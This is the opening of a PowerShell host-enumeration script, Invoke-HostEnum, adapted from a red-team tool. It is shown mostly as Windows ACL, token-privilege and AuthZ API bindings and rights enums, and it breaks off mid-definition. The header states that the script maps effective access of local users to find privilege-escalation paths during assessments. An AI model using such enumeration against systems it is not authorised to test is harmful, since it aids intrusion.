<#
	.SYNOPSIS
		Enumerate the local host
	
	.DESCRIPTION
		This is most a rip of the script from ThreatExpress however i have included the ability to enumerate all files, services, and crucial registry keys
		based on the effective access of all local users. 
		I have found it to be very useful during assessments for privilege escalation.
		I am working on a complete rewrite of the script that includes visual reporting elements; however, that is currently a low priority project

		Orginal Script: https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
	
	.NOTES
	===========================================================================
	 Created on:   		12/07/2019
	 Created by:   		David Pitre
	 Filename:     		Invoke-HostEnum.ps1
	 Version:		0.1
	 Classification:	Public

	 TODO
	 1. Tidy up the script
	 2. Implement Reporting
	===========================================================================

	.EXAMPLE
		PS C:\> Invoke-hostenum.ps1 -OutputPath "\\server\share"
	
	.LINK
		https://github.com/davidpitre/Invoke-HostEnum

#>
[CmdletBinding(PositionalBinding = $false)]
param
(
    [Parameter(Mandatory=$false)]
	[String]$OutputPath = "\\server\share"
)

$__AccessMaskEnumerations = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -eq $false } | ForEach-Object { $_.GetTypes() } | Where-Object { $_.FullName -match '^PowerShellAccessControl\..*(?<!ActiveDirectory)Rights$' }
$__AdaptedSecurityDescriptorTypeName = 'PowerShellAccessControl.Types.AdaptedSecurityDescriptor'
$__EffectiveAccessTypeName = 'PowerShellAccessControl.Types.EffectiveAccess'
$__EffectiveAccessListAllTypeName = 'PowerShellAccessControl.Types.EffectiveAccessListAllPermissions'
$__PowerShellAccessControlResourceTypeName = 'ProviderDefined'
[version] $__OsVersion = Get-WmiObject -Class Win32_OperatingSystem -Property Version | Select-Object -ExpandProperty Version
$__GroupedPropertyCache = @{}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

namespace PowerShellAccessControl {
    namespace PInvoke {
        // There are more than defined here. See http://msdn.microsoft.com/en-us/library/cc230369.aspx
        [Flags]
        public enum SecurityInformation : uint {
            Owner           = 0x00000001,
            Group           = 0x00000002,
            Dacl            = 0x00000004,
            Sacl            = 0x00000008,
            All             = 0x0000000f,
            Label           = 0x00000010,
            Attribute       = 0x00000020,
            Scope           = 0x00000040,
            ProtectedDacl   = 0x80000000,
            ProtectedSacl   = 0x40000000,
            UnprotectedDacl = 0x20000000,
            UnprotectedSacl = 0x10000000
        }

        
        public struct InheritArray {
            public Int32 GenerationGap;
            [MarshalAs(UnmanagedType.LPTStr)] public string AncestorName;
        }

        public struct GenericMapping {
            public Int32 GenericRead;
            public Int32 GenericWrite;
            public Int32 GenericExecute;
            public Int32 GenericAll;
        }

        public class advapi32 {

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa446645%28v=vs.85%29.aspx
            [DllImport("advapi32.dll", EntryPoint = "GetNamedSecurityInfoW", CharSet = CharSet.Unicode)]
            public static extern uint GetNamedSecurityInfo(
                string ObjectName,
                System.Security.AccessControl.ResourceType ObjectType,
                SecurityInformation SecurityInfo,
                out IntPtr pSidOwner,
                out IntPtr pSidGroup,
                out IntPtr pDacl,
                out IntPtr pSacl,
                out IntPtr pSecurityDescriptor
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa446654%28v=vs.85%29.aspx
            [DllImport("advapi32.dll", SetLastError=true)]
            public static extern uint GetSecurityInfo(
                IntPtr handle,
                System.Security.AccessControl.ResourceType ObjectType,
                SecurityInformation SecurityInfo,
                out IntPtr pSidOwner,
                out IntPtr pSidGroup,
                out IntPtr pDacl,
                out IntPtr pSacl,
                out IntPtr pSecurityDescriptor
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa446650%28v=vs.85%29.aspx
            [DllImport("advapi32.dll")]
            public static extern Int32 GetSecurityDescriptorLength(
                IntPtr pSecurityDescriptor
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379579%28v=vs.85%29.aspx
            [DllImport("advapi32.dll", EntryPoint = "SetNamedSecurityInfoW", CharSet = CharSet.Unicode)]
            public static extern uint SetNamedSecurityInfo(
                string ObjectName,
                System.Security.AccessControl.ResourceType ObjectType,
                SecurityInformation SecurityInfo,
                byte[] pSidOwner,
                byte[] pSidGroup,
                byte[] pDacl,
                byte[] pSacl
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379588(v=vs.85).aspx
            [DllImport("advapi32.dll")]
            public static extern Int32 SetSecurityInfo(
                IntPtr handle,
                System.Security.AccessControl.ResourceType ObjectType,
                SecurityInformation SecurityInfo,
                byte[] pSidOwner,
                byte[] pSidGroup,
                byte[] pDacl,
                byte[] pSacl
            );

            [DllImport("advapi32.dll", EntryPoint = "GetInheritanceSourceW", CharSet = CharSet.Unicode)]
            public static extern UInt32 GetInheritanceSource(
                    [MarshalAs(UnmanagedType.LPTStr)] string ObjectName,
                    System.Security.AccessControl.ResourceType ObjectType,
                    SecurityInformation SecurityInfo,
                    [MarshalAs(UnmanagedType.Bool)]bool Container,
                    IntPtr ObjectClassGuids,
                    UInt32 GuidCount,
                    byte[] Acl,
                    IntPtr pfnArray,
                    ref GenericMapping GenericMapping,
                    IntPtr InheritArray                
            );

            [DllImport("advapi32.dll", EntryPoint = "GetInheritanceSourceW", CharSet = CharSet.Unicode)]
            public static extern UInt32 GetInheritanceSource(
                    [MarshalAs(UnmanagedType.LPTStr)] string ObjectName,
                    System.Security.AccessControl.ResourceType ObjectType,
                    SecurityInformation SecurityInfo,
                    [MarshalAs(UnmanagedType.Bool)]bool Container,
                    ref Guid[] ObjectClassGuids,   // double pointer
                    UInt32 GuidCount,
                    byte[] Acl,
                    IntPtr pfnArray,
                    ref GenericMapping GenericMapping,
                    IntPtr InheritArray                
            );

            [DllImport("advapi32.dll")]
            public static extern UInt32 FreeInheritedFromArray(
                IntPtr InheritArray,
                UInt16 AceCnt,
                IntPtr pfnArray
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa375202(v=vs.85).aspx
            [DllImport("advapi32.dll", EntryPoint="AdjustTokenPrivileges", SetLastError=true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AdjustTokenPrivileges(
                IntPtr TokenHandle, 
                [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges, 
                ref TOKEN_PRIVILEGES NewState, 
                UInt32 BufferLengthInBytes,
                ref TOKEN_PRIVILEGES PreviousState, 
                out UInt32 ReturnLengthInBytes
            );

            public static Int32 AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes) {
                if (__AdjustTokenPrivileges(TokenHandle, DisableAllPrivileges, ref NewState, BufferLengthInBytes, ref PreviousState, out ReturnLengthInBytes)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379180(v=vs.85).aspx
            [DllImport("advapi32.dll", EntryPoint="LookupPrivilegeValue", SetLastError=true, CharSet=CharSet.Auto)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __LookupPrivilegeValue(
                string lpSystemName, 
                string lpName,
                out LUID lpLuid
            );

            public static Int32 LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid) {
                if (__LookupPrivilegeValue(lpSystemName, lpName, out lpLuid)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            [DllImport("advapi32.dll", EntryPoint="OpenProcessToken", SetLastError=true, CharSet=CharSet.Auto)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __OpenProcessToken(
                IntPtr ProcessHandle,
                System.Security.Principal.TokenAccessLevels DesiredAccess,
                out IntPtr TokenHandle
            );

            public static Int32 OpenProcessToken(IntPtr ProcessHandle, System.Security.Principal.TokenAccessLevels DesiredAccess, out IntPtr TokenHandle) {
                // Call original function:
                if (__OpenProcessToken(ProcessHandle, DesiredAccess, out TokenHandle)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            [Flags]
            public enum PrivilegeAttributes : uint {
                Disabled         = 0x00000000,
                EnabledByDefault = 0x00000001,
                Enabled          = 0x00000002,
                Removed          = 0x00000004,
                UsedForAccess    = 0x80000000
            }

            public struct TOKEN_PRIVILEGES {
                public UInt32 PrivilegeCount;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst=1)]
                public LUID_AND_ATTRIBUTES [] Privileges;
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379263(v=vs.85).aspx
            [StructLayout(LayoutKind.Sequential)]
            public struct LUID_AND_ATTRIBUTES {
                public LUID Luid;
                public PrivilegeAttributes Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LUID {
                public UInt32 LowPart;
                public Int32 HighPart;
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379159(v=vs.85).aspx
            [DllImport("advapi32.dll", EntryPoint="LookupAccountName", SetLastError=true)]
            static extern bool __LookupAccountName(
                string lpSystemName,
                string lpAccountName,
                [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
                ref UInt32 cbSid,
                System.Text.StringBuilder lpReferencedDomainName,
                ref UInt32 cchReferencedDomainName,
                out SID_NAME_USE peUse
            );
            public static Int32 LookupAccountName(string lpSystemName, string lpAccountName, byte[] Sid, ref UInt32 cbSid, System.Text.StringBuilder lpReferencedDomainName, ref UInt32 cchReferencedDomainName, out SID_NAME_USE peUse) {
                if (__LookupAccountName(lpSystemName, lpAccountName, Sid, ref cbSid, lpReferencedDomainName, ref cchReferencedDomainName, out peUse)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379166(v=vs.85).aspx
            [DllImport("advapi32.dll", EntryPoint="LookupAccountSid", SetLastError=true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __LookupAccountSid(
                string lpSystemName,
                [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
                System.Text.StringBuilder lpName,
                ref UInt32 cchName,
                System.Text.StringBuilder lpReferencedDomainName,
                ref UInt32 cchReferencedDomainName,
                out SID_NAME_USE peUse
            );  

            public static Int32 LookupAccountSid(string lpSystemName, byte[] Sid, System.Text.StringBuilder lpName, ref UInt32 cchName, System.Text.StringBuilder lpReferencedDomainName, ref UInt32 cchReferencedDomainName, out SID_NAME_USE peUse) {
                if (__LookupAccountSid(lpSystemName, Sid, lpName, ref cchName, lpReferencedDomainName, ref cchReferencedDomainName, out peUse)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379601(v=vs.85).aspx
            public enum SID_NAME_USE {
                User            = 1,
                Group,
                Domain,
                Alias,
                WellKnownGroup,
                DeletedAccount,
                Invalid,
                Unknown,
                Computer,
                Label
            }
        }

        public class kernel32 {
            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa366745%28v=vs.85%29.aspx
            [DllImport("kernel32.dll")]
            public static extern uint LocalSize(
                IntPtr hMem
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa366728%28v=vs.85%29.aspx
            [DllImport("kernel32.dll")]
            public static extern uint LocalFlags(
                IntPtr hMem
            );

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa366730%28v=vs.85%29.aspx
// SetLastError is true, but I'm not checking it yet...
            [DllImport("kernel32.dll", SetLastError=true)]
            public static extern IntPtr LocalFree(
                IntPtr hMem
            );

            [DllImport("kernel32.dll", EntryPoint="CloseHandle", SetLastError=true, CharSet=CharSet.Auto)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __CloseHandle(
                IntPtr hObject
            );

            public static Int32 CloseHandle(IntPtr hObject) {
                if (__CloseHandle(hObject)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            [DllImport("kernel32.dll", EntryPoint="GetFileAttributesW", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern UInt32 GetFileAttributes(
                string lpFileName
            );

        }

        namespace AuthZEnums {
            [Flags]
            public enum AuthzResourceManagerFlags : int {
                None = 0,
                NoAudit = 0x1,
                InitializeUnderImpersonation = 0x2,
                ValidInitFlags = (NoAudit | InitializeUnderImpersonation)
            };

            [Flags]
            public enum AuthzContextFlags : int {
                None = 0,
                SkipTokenGroups = 0x2,
                RequireS4ULogon = 0x4,
                ComputePrivileges = 0x8
            };

            [Flags]
            public enum AuthzAccessCheckFlags : int {
                None = 0,
                NoDeepCopySD = 0x00000001
            };

            [Flags]
            public enum AuthzInitializeResourceManagerExFlags : int {
                None = 0,
                NoAudit = 0x1,
                InitializeUnderImpersonation = 0x2,
                NoCentralAccessPolicies = 0x4
            };

            [Flags]
            public enum AuthzGenerateFlags : int {
                None = 0,
                SuccessAudit = 0x00000001,
                FailureAudit = 0x00000002
            };

            public enum AuthzContextInformationClass : int {
                UserSid = 1,
                GroupsSids,
                RestrictedSids,
                Privileges,
                ExpirationTime,
                ServerContext,
                Identifier,
                Source,
                All,
                AuthenticationId,
                SecurityAttributes,
                DeviceSids,
                UserClaims,
                DeviceClaims,
                AppContainerSid,
                CapabilitySids
            };
 
            public enum AuthzSecurityAttributeOperation : int {
                None = 0,
                ReplaceAll,
                Add,
                Delete,
                Replace
            };

            public enum AuthzSecurityAttributeValueType : ushort {
                Invalid = 0x0,
                Int     = 0x1,
                String  = 0x3,
                Boolean = 0x6,
            };
 
            [Flags]
            public enum AuthzSecurityAttributeFlags : uint {
                None = 0x0,
                NonInheritable = 0x1,
                ValueCaseSensitive = 0x2,
            };

        }

        public class authz {
            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa376322(v=vs.85).aspx
            public struct AUTHZ_ACCESS_REQUEST {
                public UInt32 DesiredAccess;
                public byte[] PrincipalSelfSid;
//                public OBJECT_TYPE_LIST[] ObjectTypeList;
                public IntPtr ObjectTypeList;
                public UInt32 ObjectTypeListLength;
                public IntPtr OptionalArguments;
            };

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379294(v=vs.85).aspx
            public struct OBJECT_TYPE_LIST {
                public UInt16 Level;
                public UInt16 Sbz;
                public IntPtr ObjectType;
//                public byte[] ObjectType;
            };

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa376321(v=vs.85).aspx
            public struct AUTHZ_ACCESS_REPLY {
                public UInt32 ResultListLength;
                public IntPtr GrantedAccessMask;
                public IntPtr SaclEvaluationResults;
                public IntPtr Error;
            };

            public struct LUID {
                public UInt32 LowPart;
                public Int32 HighPart;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct AUTHZ_SECURITY_ATTRIBUTES_INFORMATION {
                public UInt16 Version;
                public UInt16 Reserved;
                public UInt32 AttributeCount;
                public IntPtr pAttributeV1;
            }
 
            [StructLayout(LayoutKind.Sequential)]
            public struct AUTHZ_SECURITY_ATTRIBUTE_V1 {
                [MarshalAs(UnmanagedType.LPWStr)]
                public string Name;
                public UInt16 ValueType;
                public UInt32 Flags;
                public UInt32 ValueCount;
                public IntPtr Values;
            }

            [StructLayout(LayoutKind.Sequential)]
            public  struct AUTHZ_INIT_INFO_CLIENT {
                public UInt16 version;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string szResourceManagerName;
                public IntPtr pfnDynamicAccessCheck;
                public IntPtr pfnComputeDynamicGroups;
                public IntPtr pfnFreeDynamicGroups;
                public IntPtr pfnGetCentralAccessPolicy;
                public IntPtr pfnFreeCentralAccessPolicy;
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/hh448464(v=vs.85).aspx
            [StructLayout(LayoutKind.Sequential)]
            public  struct AUTHZ_RPC_INIT_INFO_CLIENT {
                public UInt16 version;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string ObjectUuid;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string ProtSeq;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string NetworkAddr;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string Endpoint;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string Options;
                [MarshalAs(UnmanagedType.LPWStr)]
                public string ServerSpn;
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa375788(v=vs.85).aspx
            [DllImport("authz.dll", EntryPoint="AuthzAccessCheck", CharSet = CharSet.Unicode, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzAccessCheck(
                UInt32 flags, 
                IntPtr hAuthzClientContext,
                ref AUTHZ_ACCESS_REQUEST pRequest, 
                IntPtr AuditEvent,
                byte[] pSecurityDescriptor, 
                byte[] OptionalSecurityDescriptorArray,
                UInt32 OptionalSecurityDescriptorCount, 
                ref AUTHZ_ACCESS_REPLY pReply, 
                out IntPtr phAccessCheckResults
            );

            public static Int32 AuthzAccessCheck(
                UInt32 flags, 
                IntPtr hAuthzClientContext,
                ref AUTHZ_ACCESS_REQUEST pRequest, 
                IntPtr AuditEvent,
                byte[] pSecurityDescriptor, 
                byte[] OptionalSecurityDescriptorArray,
                UInt32 OptionalSecurityDescriptorCount, 
                ref AUTHZ_ACCESS_REPLY pReply, 
                out IntPtr phAccessCheckResults
            ) {
                if (__AuthzAccessCheck(flags, hAuthzClientContext, ref pRequest, AuditEvent, pSecurityDescriptor, OptionalSecurityDescriptorArray, OptionalSecurityDescriptorCount, ref pReply, out phAccessCheckResults)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa376309(v=vs.85).aspx
            [DllImport("authz.dll", EntryPoint = "AuthzInitializeContextFromSid", CharSet = CharSet.Unicode, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzInitializeContextFromSid(
                UInt32 flags, 
                byte[] UserSid, 
                IntPtr hAuthzResourceManager, 
                IntPtr pExpirationTime,
                LUID Identifier, 
                IntPtr DynamicGroupArgs, 
                out IntPtr pAuthzClientContext
            );

            public static Int32 AuthzInitializeContextFromSid(
                UInt32 flags, 
                byte[] UserSid, 
                IntPtr hAuthzResourceManager, 
                IntPtr pExpirationTime,
                LUID Identifier, 
                IntPtr DynamicGroupArgs, 
                out IntPtr pAuthzClientContext
            ) {
                if (__AuthzInitializeContextFromSid(flags, UserSid, hAuthzResourceManager, pExpirationTime, Identifier, DynamicGroupArgs, out pAuthzClientContext)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa375821(v=vs.85).aspx
            [DllImport("authz.dll", EntryPoint = "AuthzFreeContext", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzFreeContext(
                IntPtr hAuthzClientContext
            );

            public static Int32 AuthzFreeContext(
                IntPtr hAuthzClientContext
            ) {
                if (__AuthzFreeContext(hAuthzClientContext)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa376313(v=vs.85).aspx
            [DllImport("authz.dll", EntryPoint = "AuthzInitializeResourceManager", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzInitializeResourceManager(
                UInt32 flags, 
                IntPtr pfnAccessCheck, 
                IntPtr pfnComputeDynamicGroups,
                IntPtr pfnFreeDynamicGroups, 
                string szResourceManagerName, 
                out IntPtr phAuthzResourceManager
            );

            public static Int32 AuthzInitializeResourceManager(
                UInt32 flags, 
                IntPtr pfnAccessCheck, 
                IntPtr pfnComputeDynamicGroups,
                IntPtr pfnFreeDynamicGroups, 
                string szResourceManagerName, 
                out IntPtr phAuthzResourceManager
            ) {
                if (__AuthzInitializeResourceManager(flags, pfnAccessCheck, pfnComputeDynamicGroups, pfnFreeDynamicGroups, szResourceManagerName, out phAuthzResourceManager)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            [DllImport("authz.dll", EntryPoint = "AuthzInitializeResourceManagerEx", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzInitializeResourceManagerEx(
                Int32 Flags,
                ref AUTHZ_INIT_INFO_CLIENT pAuthzInitInfo,
                out IntPtr phAuthzResourceManager
            );

            public static Int32 AuthzInitializeResourceManagerEx(
                Int32 Flags,
                ref AUTHZ_INIT_INFO_CLIENT pAuthzInitInfo,
                out IntPtr phAuthzResourceManager
            ) {
                if (__AuthzInitializeResourceManagerEx(Flags, ref pAuthzInitInfo, out phAuthzResourceManager)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            [DllImport("authz.dll", EntryPoint = "AuthzInitializeRemoteResourceManager", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzInitializeRemoteResourceManager(
                ref AUTHZ_RPC_INIT_INFO_CLIENT pRpcInitInfo,
                out IntPtr phAuthzResourceManager
            );

            public static Int32 AuthzInitializeRemoteResourceManager(
                ref AUTHZ_RPC_INIT_INFO_CLIENT pRpcInitInfo,
                out IntPtr phAuthzResourceManager
            ) {
                if (__AuthzInitializeRemoteResourceManager(ref pRpcInitInfo, out phAuthzResourceManager)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            // http://msdn.microsoft.com/en-us/library/windows/desktop/aa376097(v=vs.85).aspx
            [DllImport("authz.dll", EntryPoint = "AuthzFreeResourceManager", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzFreeResourceManager(
                IntPtr hAuthzResourceManager
            );

            public static Int32 AuthzFreeResourceManager(
                IntPtr hAuthzResourceManager
            ) {
                if (__AuthzFreeResourceManager(hAuthzResourceManager)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

            [DllImport("authz.dll", EntryPoint = "AuthzModifyClaims", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            static extern bool __AuthzModifyClaims(
                IntPtr hAuthzClientContext,
                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzContextInformationClass ClaimClass,
                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzSecurityAttributeOperation[] pClaimOperation,
                ref AUTHZ_SECURITY_ATTRIBUTES_INFORMATION pClaims
            );

            public static Int32 AuthzModifyClaims(
                IntPtr hAuthzClientContext,
                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzContextInformationClass ClaimClass,
                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzSecurityAttributeOperation[] pClaimOperation,
                ref AUTHZ_SECURITY_ATTRIBUTES_INFORMATION pClaims
            ) {
                if (__AuthzModifyClaims(hAuthzClientContext, ClaimClass, pClaimOperation, ref pClaims)) {
                    return 0;
                }
                else {
                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                }
            }

//            [DllImport("authz.dll", EntryPoint = "AuthzModifySids", SetLastError = true)]
//            [return: MarshalAs(UnmanagedType.Bool)]
//            static extern bool __AuthzModifySids(
//                IntPtr hAuthzClientContext,
//                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzContextInformationClass SidClass,
//                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzSecurityAttributeOperation[] pSidOperations,
//                ref TOKEN_GROUPS pSids
//            );

//            public static Int32 AuthzModifySids(
//                IntPtr hAuthzClientContext,
//                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzContextInformationClass SidClass,
//                PowerShellAccessControl.PInvoke.AuthZEnums.AuthzSecurityAttributeOperation[] pSidOperations,
//                ref AUTHZ_SECURITY_ATTRIBUTES_INFORMATION pSids
//            ) {
//                if (__AuthzModifyClaims(hAuthzClientContext, SidClass, pSidOperations, ref pSids)) {
//                    return 0;
//                }
//                else {
//                    return System.Runtime.InteropServices.Marshal.GetLastWin32Error();
//                }
//            }
        }

    }
}
"@


Add-Type -TypeDefinition @"
using System;
namespace PowerShellAccessControl {

    // Share enumeration from: http://blogs.msdn.com/b/helloworld/archive/2008/06/10/common-accessmask-value-when-configuring-share-permission-programmatically.aspx
    [Flags]
    public enum LogicalShareRights {
        FullControl      = 0x001f01ff,
        Read             = 0x001200a9, 
        Change           = 0x001301bf
    }

    // Enum info from here: http://msdn.microsoft.com/en-us/library/cc244650.aspx
    // Generic mappings (used in a future release):
    //   - Read: Server object: ReadServer; Printer object: ReadPrinter; job object: ReadJob
    //   - Write: Server object: WriteServer; Printer object: WritePrinter; job object: WriteJob
    //   - Execute: look at previous two, and you get the picture :)
    //   - All: Same as above, but using 'AllAccess'
    [Flags]
    public enum PrinterRights {
        AdministerJob = 0x00010,
        ReadSpoolFile = 0x00020,
        ExecuteJob    = ReadPermissions | AdministerJob,
        ReadJob       = ReadPermissions | ReadSpoolFile,
        WriteJob      = ReadPermissions | AdministerJob,
        JobAllAccess  = Synchronize | RightsRequired | ReadSpoolFile,
        UsePrinter    = 0x00008,
        AdministerPrinter = 0x00004,
        ManagePrinterLimited     = 0x00040,            // PrinterAllAccess
        ExecutePrinter = ReadPermissions | UsePrinter,
        Print          = ExecutePrinter,
        ReadPrinter    = ExecutePrinter,
        WritePrinter   = ExecutePrinter,
        ManagePrinter     = TakeOwnership | ChangePermissions | ReadPermissions | StandardDelete | AdministerPrinter | UsePrinter,
        PrinterAllAccess = ManagePrinter,
        //ManageDocuments   = 0xf0030,
        AdministerServer  = 0x000001,
        EnumerateServer   = 0x000002,
        ServerAllAccess   = TakeOwnership | ChangePermissions | ReadPermissions | StandardDelete | AdministerServer | EnumerateServer,
        ExecuteServer     = ReadPermissions | EnumerateServer,
        ReadServer        = ExecuteServer,
        WriteServer       = ExecuteServer | AdministerServer,
        SpecificFullControl = 0xffff,
        StandardDelete    = 0x010000,  // Standard rights below
        ReadPermissions   = 0x020000,
        ChangePermissions = 0x040000,
        TakeOwnership     = 0x080000,
        RightsRequired    = 0x0d0000,
        Synchronize       = 0x100000
    }

    [Flags]
    public enum WmiNamespaceRights {
        EnableAccount   = 0x000001,
        ExecuteMethods  = 0x000002,
        FullWrite       = 0x000004,
        PartialWrite    = 0x000008,
        ProviderWrite   = 0x000010,
        RemoteEnable    = 0x000020,
        ReadSecurity    = 0x020000,
        EditSecurity    = 0x040000
    }

    // Just Generic rights (see below)
    [Flags]
    public enum WsManAccessRights {
        Full    = 0x10000000,
        Read    = -2147483648, // 0x80000000
        Write   = 0x40000000,
        Execute = 0x20000000 
    }

    [Flags]
    public enum ServiceAccessRights {
        QueryConfig         = 0x0001,
        ChangeConfig        = 0x0002,
        QueryStatus         = 0x0004,
        EnumerateDependents = 0x0008,
        Start               = 0x0010,
        Stop                = 0x0020,
        PauseResume         = 0x0040,
        Interrogate         = 0x0080,
        UserDefinedControl  = 0x0100,
        Delete              = 0x010000,   // StandardDelete
        ReadPermissions     = 0x020000,   // StandardReadPermissions/StandardWrite
        Write               = ReadPermissions | ChangeConfig,
        Read                = ReadPermissions | QueryConfig | QueryStatus | Interrogate | EnumerateDependents,
        ChangePermissions   = 0x040000,   // StandardChangePermissions
        ChangeOwner         = 0x080000,   // StandardChangeOwner
//        Execute             = ReadPermissions | Start | Stop | PauseResume | UserDefinedControl,
        FullControl         = QueryConfig | ChangeConfig | QueryStatus | EnumerateDependents | Start | Stop | PauseResume | Interrogate | UserDefinedControl | Delete | ReadPermissions | ChangePermissions | ChangeOwner
    }

    // http://msdn.microsoft.com/en-us/library/windows/desktop/aa446632%28v=vs.85%29.aspx
    [Flags]
    public enum GenericAceRights {
        GenericAll     = 0x10000000,
        GenericExecute = 0x20000000,
        GenericWrite   = 0x40000000,
        GenericRead    = -2147483648 // 0x80000000
    }

    // http://msdn.microsoft.com/en-us/library/windows/desktop/aa379607%28v=vs.85%29.aspx
    [Flags]
    public enum StandardAccessRights {
        StandardDelete            = 0x010000,
        StandardReadPermissions   = 0x020000,
        StandardSynchronize       = 0x100000,
        StandardChangePermissions = 0x040000,
        StandardChangeOwner       = 0x080000,
        StandardAll               = 0x1f0000,
        //StandardExecute           = 0x020000,
        //StandardRead              = 0x020000,
        //StandardWrite             = 0x020000
        StandardRequired          = 0x0d0000,
    }

    [Flags]
    public enum ProcessAccessRights {
        Terminate        = 0x000001,
        CreateThread     = 0x000002,
        SetSessionId     = 0x000004,
        MemoryOperations = 0x000008,
        ReadMemory       = 0x000010,
        WriteMemory      = 0x000020,
        DuplicateHandle  = 0x000040,
        CreateProcess    = 0x000080,
        SetQuota         = 0x000100,
        SetInformation   = 0x000200,
        QueryInformation = 0x000400,
        SuspendResume    = 0x000800,
        QueryLimitedInfo = 0x001000,  // Since this bit is new to Vista+, new AllAccess was created
        AllAccessLegacy  = 0x1f0fff,
        AllAccess        = 0x1fffff,  // Top three bits of object specific rights appear to be unused
        Delete           = 0x010000,
        ReadPermissions  = 0x020000,
        ChangePermissions= 0x040000,
        TakeOwnership    = 0x080000,
        Synchronize      = 0x100000
    }

    [Flags]
    // Not using [System.DirectoryServices.ActiveDirectoryRights] b/c generic rights are mixed in. The way New-AdaptedAcl
    // handles generic rights mapping doesn't work if the enum contains the generic rights enum.
    public enum ActiveDirectoryRights {
        CreateChild       = 0x000001,
        DeleteChild       = 0x000002,
        ListChildren      = 0x000004,
        Self              = 0x000008,
        ReadProperty      = 0x000010,
        WriteProperty     = 0x000020,
        DeleteSubtree     = 0x000040,
        ListContents      = 0x000080,
